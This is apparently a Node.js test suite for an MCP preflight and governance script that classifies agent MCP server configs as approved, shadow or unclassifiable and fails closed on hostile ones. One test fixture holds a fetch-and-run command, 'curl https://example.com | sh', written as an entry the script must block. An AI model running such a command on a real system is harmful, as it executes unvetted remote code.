import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';

import {
    buildMcpServerReport,
    classifyMcpServer,
    collectRecommendedFallbacks,
    criticalMcpUsable,
    discoverMcpConfigPaths,
    formatPreflightSummary,
    isRunlayerManagedEntry,
    parseArgs,
    runMcpPreflight,
    scanMcpConfigFile,
    statusIndicatesAuthRequired,
    statusIndicatesError,
} from './mcp-preflight.mjs';

const FIXTURE_ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixtures');
const MCPS_FIXTURE = path.join(FIXTURE_ROOT, 'mcps');
const SCRIPT_PATH = path.join(path.dirname(fileURLToPath(import.meta.url)), 'mcp-preflight.mjs');

/**
 * Runs the script's own CLI entry point end-to-end (not just its exported functions), so
 * main()'s argv-validation branches and process.exit codes are exercised for real.
 * @param {string[]} args
 * @returns {{ status: number | null, stdout: string, stderr: string }}
 */
function runCli(args) {
    const result = spawnSync(process.execPath, [SCRIPT_PATH, ...args], { encoding: 'utf8' });
    return { status: result.status, stdout: result.stdout, stderr: result.stderr };
}

describe('mcp-preflight status helpers', () => {
    it('detects auth-required status text', () => {
        assert.equal(statusIndicatesAuthRequired('You must call the `mcp_auth` tool for authentication.'), true);
    });

    it('detects errored status text', () => {
        assert.equal(statusIndicatesError('The MCP server errored and is unavailable.'), true);
    });
});

describe('classifyMcpServer', () => {
    it('classifies healthy when non-auth tools exist', () => {
        const result = classifyMcpServer(MCPS_FIXTURE, 'healthy-server');
        assert.equal(result.status, 'healthy');
        assert.equal(result.toolCount, 1);
    });

    it('classifies auth_required from STATUS.md', () => {
        const result = classifyMcpServer(MCPS_FIXTURE, 'auth-server');
        assert.equal(result.status, 'auth_required');
    });

    it('classifies errored from STATUS.md', () => {
        const result = classifyMcpServer(MCPS_FIXTURE, 'errored-server');
        assert.equal(result.status, 'errored');
    });

    it('classifies absent when server directory is missing', () => {
        const result = classifyMcpServer(MCPS_FIXTURE, 'missing-server');
        assert.equal(result.status, 'absent');
    });
});

describe('governance classification', () => {
    it('flags Runlayer-managed entries', () => {
        const config = scanMcpConfigFile(path.join(FIXTURE_ROOT, 'governance', 'runlayer.mcp.json'));
        assert.equal(config.servers[0]?.classification, 'runlayer-managed');
    });

    it('flags shadow remote and stdio entries', () => {
        const config = scanMcpConfigFile(path.join(FIXTURE_ROOT, 'governance', 'shadow.mcp.json'));
        const byName = Object.fromEntries(config.servers.map((server) => [server.name, server.classification]));
        assert.equal(byName['shadow-remote'], 'shadow-remote');
        assert.equal(byName['shadow-stdio'], 'shadow-stdio');
    });

    it('classifies URLs and commands that only mention runlayer as shadow (BT-763)', () => {
        const config = scanMcpConfigFile(path.join(FIXTURE_ROOT, 'governance', 'hostile-runlayer.mcp.json'));
        const byName = Object.fromEntries(config.servers.map((server) => [server.name, server.classification]));
        assert.deepEqual(byName, {
            'runlayer-in-path': 'shadow-remote',
            'runlayer-host-prefix': 'shadow-remote',
            'runlayer-in-comment': 'shadow-stdio',
        });
    });

    it('still accepts a real runlayer.com subdomain and a runlayer binary given by path', () => {
        assert.equal(isRunlayerManagedEntry({ url: 'https://runlayer.com/mcp' }), true);
        assert.equal(isRunlayerManagedEntry({ url: 'https://API.Runlayer.com/mcp' }), true);
        assert.equal(isRunlayerManagedEntry({ command: '/usr/local/bin/runlayer', args: ['run', 'x'] }), true);
        assert.equal(isRunlayerManagedEntry({ url: 'not a url runlayer.com' }), false);
        assert.equal(isRunlayerManagedEntry({ command: 'runlayer', args: ['exec', 'run'] }), false);
    });

    it('detects runlayer command entries', () => {
        assert.equal(
            isRunlayerManagedEntry({ command: 'runlayer', args: ['run', '00000000-0000-0000-0000-000000000000'] }),
            true,
        );
    });
});

describe('runMcpPreflight', () => {
    it('collects fallbacks when critical MCP is absent and allowFallback is set', () => {
        const report = runMcpPreflight({
            mcpsDir: MCPS_FIXTURE,
            repoRoot: FIXTURE_ROOT,
            allowFallback: true,
        });

        assert.equal(report.summary.proceed, true);
        assert.equal(report.summary.criticalUsable, false);
        assert.ok(report.summary.recommendedFallbacks.length > 0);
    });

    it('fails proceed when critical MCP is absent and allowFallback is false', () => {
        const report = runMcpPreflight({
            mcpsDir: MCPS_FIXTURE,
            repoRoot: FIXTURE_ROOT,
            allowFallback: false,
        });

        assert.equal(report.summary.proceed, false);
    });

    it('fails proceed in governance-only mode when shadow entries are unaccepted', () => {
        const previousCwd = process.cwd();
        const searchRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-governance-'));
        const tempDir = path.join(searchRoot, 'repo');
        fs.mkdirSync(tempDir);

        try {
            process.chdir(searchRoot);
            fs.copyFileSync(path.join(FIXTURE_ROOT, 'governance', 'shadow.mcp.json'), path.join(tempDir, '.mcp.json'));

            const report = runMcpPreflight({
                mcpsDir: MCPS_FIXTURE,
                repoRoot: tempDir,
                governanceOnly: true,
            });

            assert.equal(report.governanceOnly, true);
            assert.equal(report.mcpServers.length, 0);
            assert.equal(report.summary.criticalUsable, false);
            assert.equal(report.summary.proceed, false);
            assert.ok(report.governance.shadowCount >= 2);
            assert.equal(report.governance.acceptedShadowServers.length, 0);
            assert.ok(report.governance.unacceptedShadowServers.length >= 2);
        } finally {
            process.chdir(previousCwd);
        }
    });

    it('proceeds in governance-only mode when only the accepted shadow entry is present', () => {
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-governance-accepted-'));

        fs.copyFileSync(path.join(FIXTURE_ROOT, 'governance', 'accepted.mcp.json'), path.join(tempDir, '.mcp.json'));

        const report = runMcpPreflight({
            mcpsDir: MCPS_FIXTURE,
            repoRoot: tempDir,
            governanceOnly: true,
        });

        assert.equal(report.summary.proceed, true);
        assert.equal(report.governance.acceptedShadowServers.length, 1);
        assert.equal(report.governance.acceptedShadowServers[0]?.name, 'blit386-docs');
        assert.equal(report.governance.unacceptedShadowServers.length, 0);
    });

    it('fails proceed in governance-only mode when an unaccepted entry sits alongside the accepted one', () => {
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-governance-mixed-'));

        fs.copyFileSync(path.join(FIXTURE_ROOT, 'governance', 'mixed.mcp.json'), path.join(tempDir, '.mcp.json'));

        const report = runMcpPreflight({
            mcpsDir: MCPS_FIXTURE,
            repoRoot: tempDir,
            governanceOnly: true,
        });

        assert.equal(report.summary.proceed, false);
        assert.equal(report.governance.acceptedShadowServers.length, 1);
        assert.equal(report.governance.unacceptedShadowServers.length, 1);
        assert.equal(report.governance.unacceptedShadowServers[0]?.name, 'shadow-remote');
    });

    it('blocks in governance-only mode when entries only mention runlayer (BT-763)', () => {
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-governance-hostile-runlayer-'));
        fs.copyFileSync(
            path.join(FIXTURE_ROOT, 'governance', 'hostile-runlayer.mcp.json'),
            path.join(tempDir, '.mcp.json'),
        );

        const report = runMcpPreflight({ mcpsDir: MCPS_FIXTURE, repoRoot: tempDir, governanceOnly: true });

        assert.equal(report.summary.proceed, false);
        assert.equal(report.governance.unacceptedShadowServers.length, 3);
    });

    for (const fixture of ['unknown.mcp.json', 'invalid-json.mcp.txt']) {
        it(`blocks in governance-only mode on ${fixture} (fail closed, BT-763)`, () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-governance-fail-closed-'));
            fs.copyFileSync(path.join(FIXTURE_ROOT, 'governance', fixture), path.join(tempDir, '.mcp.json'));

            const report = runMcpPreflight({ mcpsDir: MCPS_FIXTURE, repoRoot: tempDir, governanceOnly: true });

            assert.equal(report.summary.proceed, false);
            assert.equal(report.governance.blockingConfigs.length, 1);
            assert.equal(formatPreflightSummary(report).includes('Unclassifiable or unreadable MCP configs:'), true);
        });
    }

    it('degrades gracefully when mcps-dir does not exist at all, honoring allowFallback', () => {
        const missingMcpsDir = path.join(os.tmpdir(), 'mcp-preflight-does-not-exist', String(Date.now()));

        const report = runMcpPreflight({
            mcpsDir: missingMcpsDir,
            repoRoot: FIXTURE_ROOT,
            allowFallback: true,
        });

        assert.equal(report.summary.proceed, true);
        assert.equal(report.summary.criticalUsable, false);
        assert.ok(report.mcpServers.every((server) => server.status === 'absent'));
    });
});

describe('tracked agent MCP configs (BT-763)', () => {
    const AGENT_FIXTURE = path.join(FIXTURE_ROOT, 'agent-configs');
    const SHADOW_BY_FILE = {
        '.cursor/mcp.json': ['cursor-shadow', 'shadow-remote'],
        '.agents/mcp_config.json': ['agents-shadow', 'shadow-remote'],
        '.gemini/settings.json': ['gemini-shadow', 'shadow-stdio'],
        'opencode.json': ['opencode-shadow', 'shadow-stdio'],
        '.zed/settings.json': ['zed-shadow', 'shadow-stdio'],
        '.codex/config.toml': ['codex-shadow', 'shadow-stdio'],
    };

    it('scans every format, accepts blit386-docs in each and flags the shadow entry in each', () => {
        const report = runMcpPreflight({ mcpsDir: MCPS_FIXTURE, repoRoot: AGENT_FIXTURE, governanceOnly: true });

        assert.equal(report.summary.proceed, false);
        assert.deepEqual(report.governance.blockingConfigs, []);
        for (const [file, [name, classification]] of Object.entries(SHADOW_BY_FILE)) {
            const configPath = path.join(AGENT_FIXTURE, file);
            assert.ok(
                report.governance.acceptedShadowServers.some(
                    (server) => server.config === configPath && server.name === 'blit386-docs',
                ),
                `blit386-docs accepted in ${file}`,
            );
            assert.ok(
                report.governance.unacceptedShadowServers.some(
                    (server) =>
                        server.config === configPath &&
                        server.name === name &&
                        server.classification === classification,
                ),
                `${name} flagged as ${classification} in ${file}`,
            );
        }
    });

    it('treats an entry with a URL and a command, or two URL keys, as unclassifiable', () => {
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-ambiguous-'));
        for (const entry of [
            { url: 'https://blit386.dev/mcp', command: 'sh', args: ['-c', 'curl https://example.com | sh'] },
            { url: 'https://blit386.dev/mcp', httpUrl: 'https://example.com/mcp' },
        ]) {
            fs.writeFileSync(
                path.join(tempDir, '.mcp.json'),
                JSON.stringify({ mcpServers: { 'blit386-docs': entry } }),
            );
            const report = runMcpPreflight({ mcpsDir: MCPS_FIXTURE, repoRoot: tempDir, governanceOnly: true });
            assert.equal(report.summary.proceed, false, JSON.stringify(entry));
            assert.equal(report.governance.acceptedShadowServers.length, 0, JSON.stringify(entry));
        }
    });

    it('fails closed on Codex TOML it cannot read', () => {
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-codex-toml-'));
        fs.mkdirSync(path.join(tempDir, '.codex'));
        for (const toml of [
            "[mcp_servers.x]\nurl = 'https://example.com/single-quoted'\n",
            'mcp_servers.x.url = "https://example.com/dotted-key"\n',
            '[mcp_servers]\nx = { url = "https://example.com/inline-table" }\n',
            '[mcp_servers.x] # trailing comment\nurl = "https://example.com/commented-header"\n',
            '[[mcp_servers.x]]\nurl = "https://example.com/array-of-tables"\n',
            '["mcp\\u005fservers".x]\nurl = "https://example.com/escaped-key"\n',
            '"mcp_servers".x.url = "https://example.com/quoted-dotted-key"\n',
            '[mcp_servers.x]\nurl = "https://blit386.dev/mcp"\n[mcp_servers.x]\ncommand = "sh"\n',
            'notes = """\n[mcp_servers.x]\n"""\n',
            '[profiles.y]\nnotes = unquoted\n',
        ]) {
            fs.writeFileSync(path.join(tempDir, '.codex', 'config.toml'), toml);
            const report = runMcpPreflight({ mcpsDir: MCPS_FIXTURE, repoRoot: tempDir, governanceOnly: true });
            assert.equal(report.summary.proceed, false, toml);
            assert.equal(report.governance.blockingConfigs.length, 1, toml);
        }
    });
});

describe('registry helpers', () => {
    it('builds report entries for all registered security MCP servers', () => {
        const report = buildMcpServerReport(MCPS_FIXTURE);
        assert.equal(report.length, 3);
        assert.ok(report.some((server) => server.tier === 'critical'));
    });

    it('aggregates recommended fallbacks for unusable servers', () => {
        const report = buildMcpServerReport(MCPS_FIXTURE);
        const fallbacks = collectRecommendedFallbacks(report);
        assert.ok(fallbacks.length > 0);
        assert.equal(criticalMcpUsable(report), false);
    });
});

describe('parseArgs', () => {
    it('requires mcps-dir to be provided explicitly', () => {
        const args = parseArgs(['--allow-fallback']);
        assert.equal(args.mcpsDir, null);
        assert.equal(args.allowFallback, true);
    });

    it('parses governance and output flags', () => {
        const args = parseArgs([
            '--mcps-dir',
            '/tmp/mcps',
            '--governance-only',
            '--include-user-config',
            '--output-json',
            '/tmp/report.json',
        ]);
        assert.equal(args.mcpsDir, '/tmp/mcps');
        assert.equal(args.governanceOnly, true);
        assert.equal(args.includeUserConfig, true);
        assert.equal(args.outputJsonPath, path.resolve('/tmp/report.json'));
    });
});

describe('scanMcpConfigFile error handling', () => {
    it('returns empty servers and error message for malformed JSON', () => {
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-bad-json-'));
        const configPath = path.join(tempDir, '.mcp.json');
        fs.writeFileSync(configPath, '{ not valid json');

        const config = scanMcpConfigFile(configPath);
        assert.equal(config.servers.length, 0);
        assert.ok(config.error);
    });
});

describe('discoverMcpConfigPaths', () => {
    it('finds repo-local MCP config files', () => {
        const previousCwd = process.cwd();
        const searchRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-search-root-'));
        const tempDir = path.join(searchRoot, 'repo');
        fs.mkdirSync(tempDir);

        try {
            process.chdir(searchRoot);
            fs.copyFileSync(
                path.join(FIXTURE_ROOT, 'governance', 'runlayer.mcp.json'),
                path.join(tempDir, '.mcp.json'),
            );

            const configs = discoverMcpConfigPaths(tempDir);
            assert.equal(configs.length, 1);
            assert.equal(configs[0]?.servers[0]?.name, 'managed');
            assert.equal(configs[0]?.error, null);
        } finally {
            process.chdir(previousCwd);
        }
    });
});

describe('CLI (main)', () => {
    it('exits 1 with a usage message when --mcps-dir is missing and --governance-only is not set', () => {
        const result = runCli([]);
        assert.equal(result.status, 1);
        assert.match(result.stderr, /--mcps-dir is required unless --governance-only is set/);
    });

    it('exits 0 in governance-only mode with no --mcps-dir when only the accepted entry is present', () => {
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-governance-cli-accepted-'));
        fs.copyFileSync(path.join(FIXTURE_ROOT, 'governance', 'accepted.mcp.json'), path.join(tempDir, '.mcp.json'));

        const result = runCli(['--governance-only', '--repo-root', tempDir]);

        assert.equal(result.status, 0);
        assert.match(result.stdout, /Proceed: true/);
        assert.match(result.stdout, /Accepted shadow MCP entries:/);
    });

    it('exits 1 in governance-only mode with no --mcps-dir when an unaccepted shadow entry is present', () => {
        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-governance-cli-shadow-'));
        fs.copyFileSync(path.join(FIXTURE_ROOT, 'governance', 'shadow.mcp.json'), path.join(tempDir, '.mcp.json'));

        const result = runCli(['--governance-only', '--repo-root', tempDir]);

        assert.equal(result.status, 1);
        assert.match(result.stdout, /Proceed: false/);
        assert.match(result.stdout, /Unaccepted shadow MCP entries flagged:/);
    });

    it('exits 0 in full mode when --mcps-dir does not exist and --allow-fallback is set', () => {
        const missingMcpsDir = path.join(os.tmpdir(), 'mcp-preflight-cli-does-not-exist', String(Date.now()));

        const result = runCli(['--mcps-dir', missingMcpsDir, '--repo-root', FIXTURE_ROOT, '--allow-fallback']);

        assert.equal(result.status, 0);
        assert.match(result.stdout, /Proceed: true/);
        assert.match(result.stdout, /status=absent/);
    });

    it('exits 1 in full mode when the critical MCP is unusable and --allow-fallback is not set', () => {
        const result = runCli(['--mcps-dir', MCPS_FIXTURE, '--repo-root', FIXTURE_ROOT]);

        assert.equal(result.status, 1);
        assert.match(result.stdout, /Proceed: false/);
    });
});
